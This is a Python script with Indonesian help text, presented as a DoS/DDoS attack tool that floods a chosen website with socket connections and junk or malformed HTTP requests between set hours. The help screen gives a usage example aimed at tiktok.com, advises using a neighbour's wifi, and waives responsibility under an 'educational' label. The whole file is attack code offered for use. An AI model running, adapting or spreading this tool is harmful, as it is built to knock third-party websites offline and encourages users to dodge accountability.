import socket
import time
import sys
import os
import random
import string
import optparse
import requests
def help():
    os.system("clear")
    print("""
\033[1;90m[\033[1;95m•\033[1;90m] \033[1;96mCoding Tools By \033[1;91m: \033[1;93mRendi Noober
\033[1;90m[\033[1;95m•\033[1;90m] \033[1;96mGithub    \033[1;91m      : \033[1;93mhttps://github.com/Rendi-ID
\033[1;90m[\033[1;95m•\033[1;90m] \033[1;96mFacebook\033[1;91m        :\033[1;93m Rendi Saputra
\033[1;90m[\033[1;95m•\033[1;90m] \033[1;96mYouTube\033[1;91m         : \033[1;93mRendi Noober
\033[1;90m[\033[1;95m•\033[1;90m] \033[1;96mJenis Tools \033[1;91m    :\033[1;93m Attack
\033[1;90m[\033[1;95m•\033[1;90m] \033[1;96mWhastApp\033[1;91m        :\033[1;93m +62 899-8941-414

\033[1;93mNOTE\033[1;90m: \033[1;92mPembuat tools ini tidak akan bertanggung jawab atas apa
      yang di lakukan oleh si pengguna baik itu sengaja maupun
      tidak sengaja!!!

\033[1;96mSARAN\033[1;90m: 
\033[1;93m       KUOTA\033[1;90m:
\033[1;95m       Jika anda menggunakan tools ini dengan kuota/peket data
       saya sarankan untuk mempunyai kuota yg banyak (KALAU)
       anda menggunakan tools ini secara lama
\033[1;93m       WIFI\033[1;90m:
\033[1;95m       Kalau anda menggunakan akses wifi saya sarankan untuk
       memakai wifi tetangga atau wifi berbayar(3000)
       di karenakan serangan Dos/DDos itu mengirim paket
       dengan data yg banyak, maka dari itu kuota juga terkuras

\t\033[1;90m< \033[1;91mKETERANGAN TENTANG TOOLS INI \033[1;90m>
\033[1;92mTools ini di buat untuk pembelajaran, untuk membuat anda
mengerti dan paham bagaana cara melakukan Dos/DDos ke sebuah
website server

\t\033[1;90m<\033[1;91m FUNGSI \033[1;90m>
\033[1;92mUntuk melakukan serangan Dos/DDos ke sebuah website server
untuk melumpuhkan website dengan Cara mengirim data secara
berlebihan berbasis GB 

\t\033[1;90m<\033[1;91m CARA MEMAKAI \033[1;90m>
\033[1;95mKetik di termux\033[1;90m:
\033[1;96mpython3 Ddos_Puyuh.py -t (link web) -p (port untuk koneksikan ke web) -m (jam serangan di mulai) -s (jam serangan selesai)

\033[1;92mcontoh\033[1;90m:
\033[1;96mpython3 Ddos_Puyuh.py -t https://tiktok.com -p 80 -m 23 -s 24 --message We are legion

\033[1;93m-t\033[1;90m =\033[1;92m Untuk meng-koneksikan ke website server yang di tuju
\033[1;93m-p\033[1;90m =\033[1;92m untuk meng-koneksikan port ke website target
\033[1;93m-m \033[1;90m=\033[1;92m jam serangan di mulai (sesuaikan dengan perangkat anda)
\033[1;93m-s\033[1;90m =\033[1;92m jam serangan di hentikan (sesuaikan dengan perangkat anda)

\033[1;95mok selamat mencoba \033[1;91m:\033[1;90m)
""")

if len(sys.argv) == 1:
    help()
    exit()

try:
    run = requests.post("https://google.com")
    opt = optparse.OptionParser(add_help_option=False)

    opt.add_option("-t", dest="host")
    opt.add_option("-p", dest="port")
    opt.add_option("-m", dest="mulai")
    opt.add_option("-s", dest="selesai")
    opt.add_option("--message", dest="msg")

    opts, args = opt.parse_args()

    host = opts.host
    port = opts.port
    mulai = opts.mulai
    selesai = opts.selesai

    if opts.msg is None:
        message = string.punctuation + string.digits + string.ascii_letters + string.ascii_lowercase + string.ascii_uppercase
        msg = "".join(random.sample(message, 10))

    elif opts.msg is not None:
        msg = opts.msg

    else:
        pass

    host = str(host).replace("https://", "").replace("http://", "").replace("www.", "")

    try:
        ip = socket.gethostbyname(host)

    except socket.gaierror as e:
        print("\033[1;90m[\033[1;96m!\033[1;90m]\033[1;91m Pastikan anda memasukan website yang benar!!")
        exit()


# Time Bomb

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    while True:
        waktu = time.strftime("%H")


        if str(waktu) == str(mulai):
            try:
                print("\033[1;96mMengirim Paket Ke\033[1;91m " + host + "\033[1;92m Port\033[1;91m " + port + " \033[1;95mmulai\033[1;91m " + mulai + "\033[1;94m selesai \033[1;91m " + selesai)

                sock.connect((str(ip), int(port)))
                         
                if port == 80:
                    sock.send("GET / \nHTTP /1.1\n User-Agent: {}\n\r".format("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36").encode())
                         
                sock.send(str(msg).encode("utf-8"))
         
            except:
                sock.close()
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    
        elif str(waktu) == str(selesai):
            print("\n\033[1;90m[\033[1;95m!\033[1;90m] \033[1;91mWaktu selesai, menutup serangan!!!")
            time.sleep(1.0)
            sock.close()
            break
except requests.exceptions.ConnectionError:
    print("\033[1;90m[\033[1;95m!\033[1;90m]\033[1;91m Cek koneksi")
exit()
